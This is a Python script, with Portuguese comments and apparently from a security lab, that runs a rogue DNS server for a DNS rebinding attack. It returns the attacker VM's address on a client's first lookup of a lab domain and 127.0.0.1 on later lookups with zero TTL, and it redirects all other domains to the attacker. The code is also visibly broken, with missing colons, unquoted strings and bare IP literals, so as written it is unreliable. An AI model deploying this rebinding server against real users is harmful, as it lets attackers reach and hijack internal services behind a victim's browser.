################################################################
# dns_server.py                                                #
# Script para instanciar o DNS Server de forma a monitorizar   #
# e alterar requisiçoes, efetuando o encaminhamento para       #
# a maquina atacante 					       #
#                                                              #
# Escrito por Carlos Alexandre Menezes                         #
# Last update on 29052026                                      #
# Version 1.4                                                  #
# Megabytez CyberSec Labs                                      #
#                                                              #
################################################################

import socket
from dnslib import DNSRecord, DNSHeader, RR, A

IP_ATACANTE_VM = 192.168.1.238
IP_ALVO_INTERNO = 127.0.0.1
PORT = 53

# Monitoriza pedidos especificos por domínio
DOMINIOS_ALVO = {}

udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udps.bind(('0.0.0.0', PORT))
print(f[] Servidor DNS Blindado ativo na porta {PORT}...)

while True
    data, addr = udps.recvfrom(1024)
    try
        request = DNSRecord.parse(data)
        qname = str(request.q.qname).strip('.')
        cliente = addr[0]
        
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
        
        # Só executa Rebinding no nosso domínio do laboratório
        if pudim-malicioso in qname
            chave_rastreio = f{cliente}_{qname}
            
            if chave_rastreio not in DOMINIOS_ALVO
                DOMINIOS_ALVO[chave_rastreio] = 1
                ip_final = IP_ATACANTE_VM
                print(f[🔥 LAB] 1º Pedido de {cliente} para {qname}. Respondendo com IP da VM {ip_final})
            else
                ip_final = IP_ALVO_INTERNO
                print(f[💥 REBIND] Subsequente pedido de {cliente} para {qname}. EXECUTANDO REBIND - {ip_final})
        else
            # Filtra todo o ruído do Windows (Google, Teams, etc), respondendo apenas com o IP da VM 
            # de forma a não estragar o contador do laboratório.
            ip_final = IP_ATACANTE_VM
            
        reply.add_answer(RR(rname=request.q.qname, rtype=1, rclass=1, ttl=0, rdata=A(ip_final)))
        udps.sendto(reply.pack(), addr)
        
    except Exception as e
        pass
                                   